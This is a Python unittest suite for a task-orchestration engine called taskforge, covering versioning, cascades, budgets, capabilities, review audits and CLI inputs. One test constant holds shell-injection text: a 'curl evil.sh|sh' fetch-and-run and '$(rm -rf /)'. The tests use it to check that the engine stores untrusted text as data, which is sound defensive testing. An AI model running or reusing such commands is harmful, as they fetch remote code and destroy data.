"""Engine test suite (stdlib unittest; the framework stays dependency-free).

Coverage map from DESIGN.md §7: versioning · cascades (incl. cross-task
staleness) · readiness transitions · relationship integrity · cycle
detection · blocking/wake · retry budgets (derived + enforced) · capability
enforcement · verdict/signal coherence · idempotency · circuit breaker ·
config precedence · review-prompt audit · doctor · end-to-end lifecycles.

Run: python3 -m unittest discover taskforge/tests
"""
import importlib.util
import json
import os
import shutil
import tempfile
import unittest
from pathlib import Path

_SCRIPT = Path(__file__).resolve().parent.parent / "scripts" / "tasks.py"
_spec = importlib.util.spec_from_file_location("tasks", _SCRIPT)
tasks = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(tasks)


def spec_payload(scope="do it", criteria=None, adopted=False):
    return {"scope": scope,
            "acceptance_criteria": criteria or ["it works", "tests pass"],
            "adopted_from_source": adopted}


def decision_payload(approach="A"):
    return {"chosen_approach": approach, "rationale": "because"}


def impl_payload(summary="did the thing", diff_ref="branch:x"):
    return {"summary": summary, "diff_ref": diff_ref,
            "test_results": {"passed": 3, "failed": 0, "summary": "green"}}


def review_payload(verdict="approved", root_cause=None, findings=None):
    p = {"verdict": verdict, "findings": findings or []}
    if root_cause:
        p["root_cause"] = root_cause
    return p


class Base(unittest.TestCase):
    def setUp(self):
        self.dir = tempfile.mkdtemp(prefix="taskforge-test-")
        os.environ["TASKFORGE_DIR"] = self.dir
        os.environ.pop("TASKFORGE_MAX_REVIEW_RETRIES", None)
        os.environ.pop("TASKFORGE_MAX_VERSIONS", None)

    def tearDown(self):
        shutil.rmtree(self.dir, ignore_errors=True)
        os.environ.pop("TASKFORGE_DIR", None)

    def make(self, title="t", desc="d"):
        t = tasks.new_task(title, desc)
        tasks.record(t, "created", "taskforge")
        tasks.refresh_status(t)
        tasks.save(t)
        return t

    def apply(self, task, result, actor):
        return tasks.apply_result(task, result, actor)

    def reload(self, task):
        return tasks.load(task["id"])


class TestVersioning(Base):
    def test_versions_supersession_and_reason_placement(self):
        t = self.make()
        self.apply(t, {"artifacts": [
            {"kind": "specification", "payload": spec_payload("v1")}]},
            "refine")
        self.apply(t, {"artifacts": [
            {"kind": "specification", "payload": spec_payload("v2"),
             "supersedes_reason": "rewritten"}]}, "refine")
        t = self.reload(t)
        self.assertEqual(tasks.active(t, "specification")["version"], 2)
        v1 = t["artifacts"]["specification"][0]
        self.assertTrue(v1["superseded"])
        self.assertEqual(v1["superseded_reason"], "rewritten")

    def test_supersede_first_reason_wins(self):
        art = {"superseded": False, "superseded_reason": None,
               "superseded_at": None}
        tasks.supersede(art, "first")
        tasks.supersede(art, "second")
        self.assertEqual(art["superseded_reason"], "first")

    def test_circuit_breaker_parks_at_max_versions(self):
        t = self.make()
        for i in range(4):
            t = self.reload(t)
            self.apply(t, {"artifacts": [{
                "kind": "specification",
                "payload": spec_payload(f"v{i}")}]}, "refine")
        t = self.reload(t)
        self.assertEqual(t["status"], "blocked_on_human")


class TestCascades(Base):
    def test_decision_supersession_cascades_and_reroutes(self):
        t = self.make()
        self.apply(t, {"artifacts": [
            {"kind": "decision", "payload": decision_payload("A")}]},
            "explore")
        t = self.reload(t)
        self.apply(t, {"artifacts": [
            {"kind": "specification", "payload": spec_payload()}]}, "refine")
        t = self.reload(t)
        self.apply(t, {"artifacts": [
            {"kind": "decision", "payload": decision_payload("B"),
             "supersedes_reason": "A wrong"}]}, "explore")
        t = self.reload(t)
        self.assertIsNone(tasks.active(t, "specification"))
        self.assertEqual(tasks.evaluate(t)["readiness"], "refine")

    def test_cross_task_decision_ref_staleness(self):
        parent = self.make("parent")
        self.apply(parent, {"artifacts": [
            {"kind": "decision", "payload": decision_payload("v1")}]},
            "explore")
        parent = self.reload(parent)
        r = self.apply(parent, {"generated_tasks": [
            {"title": "kid", "description": "d", "relation": "child"}]},
            "explore")
        kid_id = r["generated_tasks"][0]
        kid = tasks.load(kid_id)
        self.assertEqual(kid["decision_ref"]["version"], 1)
        self.apply(kid, {"artifacts": [
            {"kind": "specification", "payload": spec_payload()}]}, "refine")
        parent = self.reload(parent)
        self.apply(parent, {"artifacts": [
            {"kind": "decision", "payload": decision_payload("v2"),
             "supersedes_reason": "re-explored"}]}, "explore")
        kid = tasks.load(kid_id)
        self.assertIsNone(tasks.active(kid, "specification"))
        self.assertTrue(any(e["type"] == "stale_decision_ref"
                            for e in kid["history"]))
        self.assertEqual(tasks.evaluate(kid)["readiness"], "refine")


class TestReadiness(Base):
    def test_rule_table(self):
        t = self.make()
        self.assertEqual(tasks.evaluate(t)["readiness"], "refine")
        self.apply(t, {"artifacts": [
            {"kind": "specification", "payload": spec_payload()}]}, "refine")
        t = self.reload(t)
        self.assertEqual(tasks.evaluate(t)["readiness"], "run")
        t["status"] = "done"
        self.assertEqual(tasks.evaluate(t)["readiness"], "terminal")

    def test_pending_escalation_beats_refine(self):
        t = self.make()
        self.apply(t, {"signal": "escalate_explore",
                       "signal_reason": "undecided"}, "refine")
        t = self.reload(t)
        self.assertEqual(tasks.evaluate(t)["readiness"], "explore")
        self.apply(t, {"artifacts": [
            {"kind": "decision", "payload": decision_payload()}]}, "explore")
        t = self.reload(t)
        self.assertIsNone(t["pending_escalation"])
        self.assertEqual(tasks.evaluate(t)["readiness"], "refine")

    def test_blocked_on_human_blocker_does_not_release(self):
        blocker, t = self.make("b"), self.make("t")
        self.apply(t, {"edges": [
            {"type": "blocked_by", "target": blocker["id"]}]}, "human")
        blocker = self.reload(blocker)
        blocker["status"] = "blocked_on_human"
        tasks.save(blocker)
        t = self.reload(t)
        self.assertEqual(tasks.evaluate(t)["readiness"], "waiting")

    def test_dangling_blocker_waits(self):
        t = self.make()
        t["edges"].append({"type": "blocked_by", "target": "TASK-ghost1234567",
                           "created_at": tasks.now(), "reason": None})
        self.assertEqual(tasks.evaluate(t)["readiness"], "waiting")


class TestRelationships(Base):
    def test_inverse_edges_rejected_with_pointer(self):
        for bad, canonical in (("blocks", "blocked_by"),
                               ("children", "parent"),
                               ("depends_on", "blocked_by")):
            with self.assertRaises(tasks.TaskforgeError) as cm:
                tasks.validate_edge_type(bad)
            self.assertIn(canonical, str(cm.exception))

    def test_relation_wiring(self):
        t = self.make()
        r = self.apply(t, {"generated_tasks": [
            {"title": "f", "description": "d", "relation": "follow_up"},
            {"title": "p", "description": "d", "relation": "prerequisite",
             "reason": "need it"}]}, "refine")
        t = self.reload(t)
        fu, pre = (tasks.load(i) for i in r["generated_tasks"])
        self.assertTrue(tasks.has_edge(fu, "generated_from", t["id"]))
        self.assertFalse(tasks.has_edge(t, "blocked_by", fu["id"]))
        self.assertTrue(tasks.has_edge(t, "blocked_by", pre["id"]))
        self.assertEqual(fu["source"]["type"], "internal")
        self.assertEqual(tasks.evaluate(t)["readiness"], "waiting")

    def test_edges_idempotent_and_no_self_edges(self):
        a, b = self.make("a"), self.make("b")
        for _ in range(2):
            a = self.reload(a)
            self.apply(a, {"edges": [
                {"type": "relates_to", "target": b["id"]}]}, "human")
        a = self.reload(a)
        self.assertEqual(
            len([e for e in a["edges"] if e["type"] == "relates_to"]), 1)
        with self.assertRaises(tasks.TaskforgeError):
            tasks.validate_result(
                {"edges": [{"type": "relates_to", "target": a["id"]}]},
                "human", a)


class TestCycles(Base):
    def _block(self, x, y):
        x = self.reload(x)
        self.apply(x, {"edges": [{"type": "blocked_by", "target": y["id"]}]},
                   "human")

    def test_direct_and_transitive_cycles(self):
        a, b, c = self.make("a"), self.make("b"), self.make("c")
        self._block(a, b)
        self._block(b, c)
        self._block(c, a)
        ev = tasks.evaluate(self.reload(a))
        self.assertEqual(ev["readiness"], "human")
        self.assertIn(a["id"], ev["cycle"])

    def test_diamond_is_not_a_cycle(self):
        a, b, c, d = (self.make(x) for x in "abcd")
        self._block(a, b)
        self._block(a, c)
        self._block(b, d)
        self._block(c, d)
        self.assertEqual(tasks.evaluate(self.reload(a))["readiness"],
                         "waiting")


class TestBlockingAndWake(Base):
    def test_done_wakes_waiters_cancel_too(self):
        t = self.make()
        r = self.apply(t, {"generated_tasks": [
            {"title": "p", "description": "d", "relation": "prerequisite",
             "reason": "need"}]}, "refine")
        pre = tasks.load(r["generated_tasks"][0])
        self.apply(pre, {"signal": "done"}, "human")
        t = self.reload(t)
        self.assertEqual(tasks.evaluate(t)["readiness"], "refine")
        self.assertTrue(any(e["type"] == "unblocked" for e in t["history"]))


class TestBudgets(Base):
    def _reject(self, t):
        t = self.reload(t)
        return self.apply(t, {"artifacts": [
            {"kind": "implementation", "payload": impl_payload()},
            {"kind": "review",
             "payload": review_payload("rejected", "implementation",
                                       ["bad"])}]}, "run")

    def test_derivation_and_engine_enforcement(self):
        t = self.make()
        self.apply(t, {"artifacts": [
            {"kind": "specification", "payload": spec_payload()}]}, "refine")
        self._reject(t)
        self._reject(t)
        t = self.reload(t)
        self.assertEqual(tasks.review_rejections_in_current_cycle(t), 2)
        self.assertNotEqual(t["status"], "blocked_on_human")
        self._reject(t)  # third rejection exceeds 2 retries -> engine parks
        t = self.reload(t)
        self.assertEqual(t["status"], "blocked_on_human")
        blocked = [e for e in t["history"] if e["type"] == "human_blocked"]
        self.assertIn("budget", blocked[-1]["reason"])
        self.assertEqual(blocked[-1]["detail"].get("enforced_by"), "engine")

    def test_human_update_resets_cycle_and_resumes(self):
        t = self.make()
        tasks.record(t, "review_rejected", "run")
        tasks.record(t, "human_updated", "human")
        self.assertEqual(tasks.review_rejections_in_current_cycle(t), 0)


class TestCapabilities(Base):
    def test_actor_artifact_restriction(self):
        t = self.make()
        with self.assertRaises(tasks.TaskforgeError):
            tasks.validate_result({"artifacts": [
                {"kind": "implementation", "payload": impl_payload()}]},
                "refine", t)

    def test_actor_signal_and_relation_restrictions(self):
        t = self.make()
        with self.assertRaises(tasks.TaskforgeError):
            tasks.validate_result(
                {"signal": "done"}, "explore", t)
        with self.assertRaises(tasks.TaskforgeError):
            tasks.validate_result({"generated_tasks": [
                {"title": "x", "description": "y", "relation": "child"}]},
                "run", t)

    def test_unknown_actor_denied(self):
        with self.assertRaises(tasks.TaskforgeError) as cm:
            tasks.validate_result({}, "rogue")
        self.assertIn("capabilities.json", str(cm.exception))

    def test_terminal_tasks_writable_only_by_human(self):
        t = self.make()
        t["status"] = "done"
        tasks.save(t)
        with self.assertRaises(tasks.TaskforgeError):
            tasks.validate_result({"notes": "late"}, "run", self.reload(t))


class TestCoherence(Base):
    def test_done_requires_approved_review(self):
        t = self.make()
        with self.assertRaises(tasks.TaskforgeError) as cm:
            tasks.validate_result({"artifacts": [
                {"kind": "implementation", "payload": impl_payload()},
                {"kind": "review",
                 "payload": review_payload("rejected", "implementation")}],
                "signal": "done"}, "run", t)
        self.assertIn("approved", str(cm.exception))

    def test_rejected_review_requires_root_cause(self):
        with self.assertRaises(tasks.TaskforgeError):
            tasks.validate_payload("review", {"verdict": "rejected"})

    def test_escalations_require_reason(self):
        with self.assertRaises(tasks.TaskforgeError):
            tasks.validate_result({"signal": "escalate_explore"}, "refine")


class TestIdempotency(Base):
    def test_duplicate_result_id_is_noop(self):
        t = self.make()
        result = {"result_id": "r-1", "artifacts": [
            {"kind": "specification", "payload": spec_payload()}]}
        self.apply(t, result, "refine")
        r2 = self.apply(self.reload(t), result, "refine")
        self.assertFalse(r2["applied"])
        t = self.reload(t)
        self.assertEqual(len(t["artifacts"]["specification"]), 1)

    def test_missing_result_id_warns(self):
        warnings = tasks.validate_result({}, "human")
        self.assertTrue(any("result_id" in w for w in warnings))


class TestEscalationSemantics(Base):
    def test_escalate_refine_supersedes_spec(self):
        t = self.make()
        self.apply(t, {"artifacts": [
            {"kind": "specification", "payload": spec_payload()}]}, "refine")
        t = self.reload(t)
        self.apply(t, {"signal": "escalate_refine",
                       "signal_reason": "ambiguous"}, "run")
        t = self.reload(t)
        self.assertIsNone(tasks.active(t, "specification"))
        self.assertEqual(tasks.evaluate(t)["readiness"], "refine")

    def test_child_architecture_escalation_reaches_parent(self):
        parent = self.make("parent")
        self.apply(parent, {"artifacts": [
            {"kind": "decision", "payload": decision_payload()}]}, "explore")
        parent = self.reload(parent)
        r = self.apply(parent, {"generated_tasks": [
            {"title": "kid", "description": "d", "relation": "child"}]},
            "explore")
        kid = tasks.load(r["generated_tasks"][0])
        self.apply(kid, {"signal": "escalate_explore",
                         "signal_reason": "cannot work"}, "run")
        parent = self.reload(parent)
        self.assertEqual(parent["pending_escalation"], "explore")


class TestConfig(Base):
    def test_env_overrides_file(self):
        tasks.ensure_config_file()
        os.environ["TASKFORGE_MAX_REVIEW_RETRIES"] = "5"
        try:
            self.assertEqual(tasks.config()["max_review_retries"], 5)
        finally:
            del os.environ["TASKFORGE_MAX_REVIEW_RETRIES"]
        self.assertEqual(tasks.config()["max_review_retries"], 2)


class TestReviewAudit(Base):
    def _runnable(self):
        t = self.make()
        self.apply(t, {"artifacts": [
            {"kind": "specification",
             "payload": spec_payload(criteria=["criterion alpha",
                                               "criterion beta"])}]},
            "refine")
        return self.reload(t)

    def test_clean_audit(self):
        t = self._runnable()
        prompt = ("Spec criteria: criterion alpha; criterion beta.\n"
                  "Diff: +change\nTests: green")
        self.apply(t, {"artifacts": [
            {"kind": "implementation",
             "payload": impl_payload(summary="SECRET_REASONING_XYZ")}]},
            "run")
        tasks.record_review_prompt(t["id"], 1, prompt)
        t = self.reload(t)
        self.apply(t, {"artifacts": [
            {"kind": "review", "payload": review_payload()}]}, "run")
        report = tasks.audit_review(t["id"])
        self.assertTrue(report["clean"], report["findings"])

    def test_leak_and_missing_criterion_detected(self):
        t = self._runnable()
        self.apply(t, {"artifacts": [
            {"kind": "implementation",
             "payload": impl_payload(summary="SECRET_REASONING_XYZ")}]},
            "run")
        bad_prompt = ("criterion alpha only. My approach: "
                      "SECRET_REASONING_XYZ")
        tasks.record_review_prompt(t["id"], 1, bad_prompt)
        t = self.reload(t)
        self.apply(t, {"artifacts": [
            {"kind": "review", "payload": review_payload()}]}, "run")
        report = tasks.audit_review(t["id"])
        self.assertFalse(report["clean"])
        text = " ".join(report["findings"])
        self.assertIn("criterion beta", text)      # missing criterion
        self.assertIn("leaked", text)              # isolation violation

    def test_unrecorded_review_flagged(self):
        t = self._runnable()
        self.apply(t, {"artifacts": [
            {"kind": "implementation", "payload": impl_payload()},
            {"kind": "review", "payload": review_payload()}]}, "run")
        report = tasks.audit_review(t["id"])
        self.assertFalse(report["clean"])
        self.assertIn("no recorded prompt", report["findings"][0])


class TestDoctor(Base):
    def test_findings(self):
        t = self.make()
        t["edges"].append({"type": "blocked_by", "target": "TASK-ghost123456",
                           "created_at": tasks.now(), "reason": None})
        tasks.save(t)
        report = tasks.doctor()
        self.assertFalse(report["clean"])
        self.assertTrue(any("dangling" in f for f in report["findings"]))


class TestLifecycles(Base):
    """End-to-end flows through apply_result only — the integration layer."""

    def test_adopt_run_done_wake(self):
        dep = self.make("dependent")
        t = self.make("main")
        self.apply(dep, {"edges": [
            {"type": "blocked_by", "target": t["id"]}]}, "human")
        self.apply(t, {"result_id": "r1", "artifacts": [
            {"kind": "specification",
             "payload": spec_payload(adopted=True)}]}, "refine")
        t = self.reload(t)
        self.assertEqual(tasks.evaluate(t)["readiness"], "run")
        self.apply(t, {"result_id": "r2", "artifacts": [
            {"kind": "implementation", "payload": impl_payload()},
            {"kind": "review", "payload": review_payload()}],
            "signal": "done",
            "signal_reason": None,
            "notes": "approved v1"}, "run")
        t, dep = self.reload(t), self.reload(dep)
        self.assertEqual(t["status"], "done")
        self.assertEqual(tasks.evaluate(dep)["readiness"], "refine")

    def test_escalate_decide_decompose_complete(self):
        t = self.make("big feature")
        self.apply(t, {"signal": "escalate_explore",
                       "signal_reason": "undecided"}, "refine")
        t = self.reload(t)
        r = self.apply(t, {"artifacts": [
            {"kind": "decision", "payload": decision_payload()}],
            "generated_tasks": [
                {"title": "A", "description": "a", "relation": "child"},
                {"title": "B", "description": "b", "relation": "child"}]},
            "explore")
        t = self.reload(t)
        self.assertEqual(tasks.evaluate(t)["readiness"], "waiting")
        for kid_id in r["generated_tasks"]:
            kid = tasks.load(kid_id)
            self.assertEqual(kid["decision_ref"]["task_id"], t["id"])
            self.apply(kid, {"artifacts": [
                {"kind": "specification", "payload": spec_payload()}]},
                "refine")
            kid = tasks.load(kid_id)
            self.apply(kid, {"artifacts": [
                {"kind": "implementation", "payload": impl_payload()},
                {"kind": "review", "payload": review_payload()}],
                "signal": "done"}, "run")
        t = self.reload(t)
        self.assertEqual(tasks.evaluate(t)["readiness"], "refine")

    def test_clarify_block_answer_resume(self):
        t = self.make()
        r = self.apply(t, {"generated_tasks": [
            {"title": "which regions?", "description": "product must decide",
             "relation": "prerequisite", "reason": "cannot spec"}]},
            "refine")
        t = self.reload(t)
        self.assertEqual(tasks.evaluate(t)["readiness"], "waiting")
        clar = tasks.load(r["generated_tasks"][0])
        self.apply(clar, {"signal": "done"}, "human")
        t = self.reload(t)
        self.assertEqual(tasks.evaluate(t)["readiness"], "refine")

    def test_park_then_human_update_resumes(self):
        t = self.make()
        self.apply(t, {"signal": "block_on_human",
                       "signal_reason": "conflicting requirements"}, "refine")
        t = self.reload(t)
        self.assertEqual(t["status"], "blocked_on_human")
        t["status"] = "new"
        tasks.record(t, "human_updated", "human", reason="resolved: option B")
        tasks.apply_result(t, {"artifacts": [
            {"kind": "specification", "payload": spec_payload("option B")}]},
            "human")
        t = self.reload(t)
        self.assertEqual(tasks.evaluate(t)["readiness"], "run")


if __name__ == "__main__":
    unittest.main()


class TestHumanExemption(Base):
    def test_human_may_close_reviewless_task_but_run_may_not(self):
        t = self.make()
        # run cannot declare done without an approved review:
        with self.assertRaises(tasks.TaskforgeError):
            tasks.validate_result({"signal": "done"}, "run", t)
        # human can (clarification-style closure), and it's on the record:
        self.apply(t, {"signal": "done"}, "human")
        t = self.reload(t)
        self.assertEqual(t["status"], "done")
        self.assertEqual(t["history"][-1]["actor"], "human")


class TestRetryAfterTerminal(Base):
    def test_duplicate_result_id_is_noop_even_on_terminal_task(self):
        t = self.make()
        self.apply(t, {"result_id": "s1", "artifacts": [
            {"kind": "specification", "payload": spec_payload()}]}, "refine")
        t = self.reload(t)
        result = {"result_id": "d1", "artifacts": [
            {"kind": "implementation", "payload": impl_payload()},
            {"kind": "review", "payload": review_payload()}],
            "signal": "done"}
        self.apply(t, result, "run")          # makes the task terminal
        r2 = self.apply(self.reload(t), result, "run")   # retry-after-timeout
        self.assertFalse(r2["applied"])
        self.assertEqual(r2["duplicate_of"], "d1")


class TestReopen(Base):
    """Reopen restores a closed terminal (done/cancelled) to active work
    without losing artifacts, reviews, decisions, or history. Routing is
    derived from what the task already has — reopen assigns no state."""

    def close(self, task, signal="done"):
        self.apply(task, {"signal": signal, "signal_reason": "x"}, "human")
        return self.reload(task)

    def spec(self, task):
        self.apply(task, {"artifacts": [
            {"kind": "specification", "payload": spec_payload()}]}, "refine")
        return self.reload(task)

    def test_done_reopens_to_run_when_spec_present(self):
        t = self.spec(self.make())
        t = self.close(t, "done")
        self.assertEqual(t["status"], "done")
        t = tasks.reopen(t, "extend the feature")
        self.assertEqual(tasks.evaluate(t)["readiness"], "run")
        self.assertNotIn(t["status"], tasks.TERMINAL)

    def test_cancelled_reopens_to_refine_without_spec(self):
        t = self.close(self.make(), "cancelled")
        t = tasks.reopen(t, "back on the roadmap")
        self.assertEqual(tasks.evaluate(t)["readiness"], "refine")

    def test_reopen_preserves_all_artifacts_and_history(self):
        t = self.spec(self.make())
        self.apply(t, {"artifacts": [
            {"kind": "implementation", "payload": impl_payload("SECRET")},
            {"kind": "review", "payload": review_payload("approved")}],
            "signal": "done"}, "run")
        t = self.reload(t)
        before = json.dumps(t["artifacts"], sort_keys=True)
        hist_len = len(t["history"])
        t = tasks.reopen(t, "redo")
        # Artifacts byte-identical; history only grew (append-only).
        self.assertEqual(json.dumps(t["artifacts"], sort_keys=True), before)
        self.assertEqual(tasks.active(t, "implementation")["payload"]["summary"],
                         "SECRET")
        self.assertEqual(tasks.active(t, "review")["payload"]["verdict"],
                         "approved")
        self.assertEqual(len(t["history"]), hist_len + 1)
        self.assertEqual(t["history"][-1]["type"], "reopened")
        self.assertEqual(t["history"][-1]["reason"], "redo")

    def test_reopen_routes_to_explore_with_pending_escalation(self):
        t = self.make()
        self.apply(t, {"signal": "escalate_explore",
                       "signal_reason": "undecided"}, "refine")
        t = self.reload(t)
        # Park it terminal, then reopen — the pending escalation survives.
        t["status"] = "cancelled"
        tasks.save(t)
        t = tasks.reopen(t, "revisit")
        self.assertEqual(tasks.evaluate(t)["readiness"], "explore")

    def test_reopen_rejects_non_terminal(self):
        t = self.make()
        with self.assertRaises(tasks.TaskforgeError) as ctx:
            tasks.reopen(t, "x")
        self.assertIn("nothing to reopen", str(ctx.exception))

    def test_reopen_rejects_blocked_on_human_points_to_human_update(self):
        t = self.make()
        self.apply(t, {"signal": "block_on_human",
                       "signal_reason": "conflict"}, "refine")
        t = self.reload(t)
        with self.assertRaises(tasks.TaskforgeError) as ctx:
            tasks.reopen(t, "x")
        self.assertIn("human-update", str(ctx.exception))

    def test_second_reopen_errors(self):
        t = self.close(self.make(), "done")
        t = tasks.reopen(t, "once")
        with self.assertRaises(tasks.TaskforgeError):
            tasks.reopen(t, "twice")

    def test_reopen_reblocks_still_active_dependent(self):
        blocker = self.make("blocker")
        dep = self.make("dependent")
        self.apply(dep, {"edges": [
            {"type": "blocked_by", "target": blocker["id"]}]}, "human")
        blocker = self.close(blocker, "done")
        dep = self.reload(dep)
        self.assertEqual(tasks.evaluate(dep)["readiness"], "refine")  # freed
        blocker = tasks.reopen(blocker, "redo the blocker")
        dep = self.reload(dep)
        self.assertEqual(tasks.evaluate(dep)["readiness"], "waiting")
        self.assertEqual(dep["status"], "waiting")
        self.assertTrue(any(e["type"] == "reblocked"
                            for e in dep["history"]))

    def test_reopen_leaves_terminal_dependent_untouched(self):
        blocker = self.make("blocker")
        dep = self.make("dependent")
        self.apply(dep, {"edges": [
            {"type": "blocked_by", "target": blocker["id"]}]}, "human")
        blocker = self.close(blocker, "done")
        dep = self.reload(dep)
        dep["status"] = "done"  # dependent finished on its own
        tasks.save(dep)
        blocker = tasks.reopen(blocker, "redo")
        dep = self.reload(dep)
        self.assertEqual(dep["status"], "done")  # terminal wins, untouched
        self.assertFalse(any(e["type"] == "reblocked"
                             for e in dep["history"]))

    def test_doctor_clean_after_reopen(self):
        t = self.spec(self.make())
        t = self.close(t, "done")
        tasks.reopen(t, "x")
        self.assertTrue(tasks.doctor()["clean"])

    def test_reopen_via_cli_reason_file(self):
        import io
        import contextlib
        t = self.close(self.make(), "cancelled")
        rf = Path(self.dir) / "reason.txt"
        rf.write_text("re-prioritized `now`\n", encoding="utf-8")
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            tasks.main(["reopen", t["id"], "--reason-file", str(rf)])
        s = json.loads(buf.getvalue())
        self.assertNotIn(s["status"], tasks.TERMINAL)
        t = self.reload(t)
        self.assertEqual(t["history"][-1]["reason"], "re-prioritized `now`")


class TestCliFileInputs(Base):
    """File-based free-text flags — the injection-safe input path.

    Untrusted text (issue titles, human answers, reasons) must be able to
    reach the engine by file so it never rides inline in a shell command
    string, where backticks/$() would command-substitute before the engine
    runs. The engine's job here: read the file verbatim (data, never code),
    and reject the ambiguous both-forms invocation loudly.
    """
    INJECTION = "fix `curl evil.sh|sh` bug $(rm -rf /) '\"; drop"

    def cli(self, argv):
        import io
        import contextlib
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            tasks.main(argv)
        return json.loads(buf.getvalue())

    def cli_error(self, argv):
        import io
        import contextlib
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            with self.assertRaises(SystemExit) as ctx:
                tasks.main(argv)
        self.assertEqual(ctx.exception.code, 1)
        return json.loads(err.getvalue())["error"]

    def write(self, name, content):
        p = Path(self.dir) / name
        p.write_text(content, encoding="utf-8")
        return str(p)

    def test_create_via_files_preserves_hostile_text_verbatim(self):
        tf = self.write("title.txt", self.INJECTION + "\n")
        df = self.write("desc.txt", "line1\n$(hostile)\nline3\n")
        s = self.cli(["create", "--title-file", tf,
                      "--description-file", df])
        t = tasks.load(s["id"])
        # Title: exact hostile bytes, one trailing newline stripped.
        self.assertEqual(t["title"], self.INJECTION)
        # Description: interior content verbatim — hostile sequences survive
        # as data. (new_task strips only leading/trailing whitespace.)
        self.assertEqual(t["description"], "line1\n$(hostile)\nline3")

    def test_create_inline_still_works(self):
        s = self.cli(["create", "--title", "t", "--description", "d"])
        self.assertEqual(tasks.load(s["id"])["title"], "t")

    def test_create_rejects_both_title_forms(self):
        tf = self.write("t.txt", "x")
        msg = self.cli_error(["create", "--title", "a", "--title-file", tf,
                              "--description", "d"])
        self.assertIn("not both", msg)

    def test_create_rejects_both_description_forms(self):
        df = self.write("d.txt", "x")
        msg = self.cli_error(["create", "--title", "a",
                              "--description", "d",
                              "--description-file", df])
        self.assertIn("not both", msg)

    def test_create_requires_a_title_form(self):
        msg = self.cli_error(["create", "--description", "d"])
        self.assertIn("--title", msg)

    def test_human_update_note_file(self):
        t = self.make()
        nf = self.write("note.txt", self.INJECTION + "\n")
        self.cli(["human-update", t["id"], "--note-file", nf])
        events = [e for e in self.reload(t)["history"]
                  if e["type"] == "human_updated"]
        self.assertEqual(events[-1]["reason"], self.INJECTION)

    def test_cancel_reason_file(self):
        t = self.make()
        rf = self.write("reason.txt", "superseded by `new` plan\n")
        s = self.cli(["cancel", t["id"], "--reason-file", rf])
        self.assertEqual(s["status"], "cancelled")
        events = [e for e in self.reload(t)["history"]
                  if e["type"] == "cancelled"]
        self.assertEqual(events[-1]["reason"], "superseded by `new` plan")

    def test_cancel_requires_a_reason_form(self):
        t = self.make()
        msg = self.cli_error(["cancel", t["id"]])
        self.assertIn("--reason", msg)


class TestM3Findings(Base):
    def test_store_is_self_ignoring_by_default(self):
        tasks.ensure_config_file()
        gi = tasks.store_dir() / ".gitignore"
        self.assertTrue(gi.exists())
        self.assertEqual(gi.read_text().strip(), "*")

    def test_budget_reports_next_review_version(self):
        import io, contextlib, json as _json
        t = self.make()
        self.apply(t, {"artifacts": [
            {"kind": "specification", "payload": spec_payload()}]}, "refine")
        t = self.reload(t)
        self.apply(t, {"artifacts": [
            {"kind": "implementation", "payload": impl_payload()},
            {"kind": "review",
             "payload": review_payload("rejected", "implementation",
                                       ["f"])}]}, "run")
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            tasks.main(["budget", t["id"]])
        b = _json.loads(buf.getvalue())
        self.assertEqual(b["total_reviews"], 1)
        self.assertEqual(b["next_review_version"], 2)
